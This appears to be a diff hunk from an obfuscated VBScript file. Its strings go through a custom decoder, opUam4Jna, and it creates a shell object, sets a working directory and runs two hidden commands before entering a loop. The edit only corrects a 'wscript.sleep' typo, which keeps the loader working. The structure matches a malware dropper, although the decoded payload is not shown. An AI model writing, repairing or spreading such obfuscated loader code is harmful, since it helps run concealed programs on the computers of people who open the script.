@@ -98,7 +98,7 @@ kW55hF.Close
 Set dD0m682 = CreateObject(opUam4Jna("0@]MaIBYyhV_zfajl$[I%^p[3b*bu\"))
 dD0m682.CurrentDirectory = opUam4Jna("]\x9u0ER{KRib[OhDi<RXW") + eOzLlxaX + opUam4Jna("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf")
 dD0m682.Run gC6kYiqq
-wSript.sleep 2000
+wscript.sleep 2000
 dD0m682.Run oRUtSExg
 xFOZCMmFA = true
 do While (xFOZCMmFA = true)
